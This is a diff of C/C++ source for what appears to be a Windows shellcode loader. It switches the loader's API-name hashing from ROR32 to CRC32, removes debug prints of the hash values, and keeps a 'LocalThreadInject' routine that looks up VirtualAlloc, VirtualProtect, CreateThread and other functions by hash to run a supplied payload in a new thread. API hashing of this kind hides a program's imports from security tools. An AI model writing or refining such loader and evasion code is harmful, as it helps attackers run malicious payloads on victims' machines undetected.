@@ -37,7 +37,7 @@ constexpr DWORD HashStringCrc32(const char* String) {
 }
 
 #define RTIME_HASHA( API ) HashStringCrc32( ( const char* ) API )
-#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringCrc32( ( const char* ) #API );
+#define CTIME_HASHA( API ) constexpr auto API##_CRC32A = HashStringCrc32( ( const char* ) #API );
 
 FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
 	PBYTE pBase = ( PBYTE ) hModule;
@@ -69,6 +69,8 @@ FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
 
 	return NULL;
 }
+
+// ---
 
 typedef LPVOID ( WINAPI * fnVirtualAlloc ) (
     LPVOID  lpAddress,
@@ -124,17 +126,7 @@ BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
         return FALSE;
     }
 
-    #ifdef DEBUG
-    // print hash values
-    printf( "[i] VirtualAlloc : 0x%0.8X\n", VirtualAlloc_Rotr32A );
-    printf( "[i] VirtualProtect : 0x%0.8X\n", VirtualProtect_Rotr32A );
-    printf( "[i] CreateThread : 0x%0.8X\n", CreateThread_Rotr32A );
-    printf( "[i] WaitForSingleObject : 0x%0.8X\n", WaitForSingleObject_Rotr32A );
-    printf( "[i] HeapFree : 0x%0.8X\n", HeapFree_Rotr32A );
-    printf( "[i] GetProcessHeap : 0x%0.8X\n", GetProcessHeap_Rotr32A );
-    #endif
-
-    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_Rotr32A );
+    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
     if ( pVirtualAlloc == NULL ) {
         #ifdef DEBUG
         printf( "[-] Unable to get address for VirtualAlloc\n" );
@@ -143,7 +135,7 @@ BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
         return FALSE;
     }
 
-    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_Rotr32A );
+    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_CRC32A );
     if ( pVirtualProtect == NULL ) {
         #ifdef DEBUG
         printf( "[-] Unable to get address for VirtualProtect\n" );
@@ -152,7 +144,7 @@ BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
         return FALSE;
     }
 
-    fnCreateThread pCreateThread = ( fnCreateThread ) GetProcAddressH( hKernel32, CreateThread_Rotr32A );
+    fnCreateThread pCreateThread = ( fnCreateThread ) GetProcAddressH( hKernel32, CreateThread_CRC32A );
     if ( pCreateThread == NULL ) {
         #ifdef DEBUG
         printf( "[-] Unable to get address for CreateThread\n" );
@@ -161,7 +153,7 @@ BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
         return FALSE;
     }
 
-    fnWaitForSingleObject pWaitForSingleObject = ( fnWaitForSingleObject ) GetProcAddressH( hKernel32, WaitForSingleObject_Rotr32A );
+    fnWaitForSingleObject pWaitForSingleObject = ( fnWaitForSingleObject ) GetProcAddressH( hKernel32, WaitForSingleObject_CRC32A );
     if ( pWaitForSingleObject == NULL ) {
         #ifdef DEBUG
         printf( "[-] Unable to get address for WaitForSingleObject\n" );
@@ -170,7 +162,7 @@ BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
         return FALSE;
     }
 
-    fnHeapFree pHeapFree = ( fnHeapFree ) GetProcAddressH( hKernel32, HeapFree_Rotr32A );
+    fnHeapFree pHeapFree = ( fnHeapFree ) GetProcAddressH( hKernel32, HeapFree_CRC32A );
     if ( pHeapFree == NULL ) {
         #ifdef DEBUG
         printf( "[-] Unable to get address for HeapFree\n" );
@@ -179,7 +171,7 @@ BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
         return FALSE;
     }
 
-    fnGetProcessHeap pGetProcessHeap = ( fnGetProcessHeap ) GetProcAddressH( hKernel32, GetProcessHeap_Rotr32A );
+    fnGetProcessHeap pGetProcessHeap = ( fnGetProcessHeap ) GetProcAddressH( hKernel32, GetProcessHeap_CRC32A );
     if ( pGetProcessHeap == NULL ) {
         #ifdef DEBUG
         printf( "[-] Unable to get address for GetProcessHeap\n" );
@@ -187,8 +179,6 @@ BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
         
         return FALSE;
     }
-
-    
 
     // ---
 
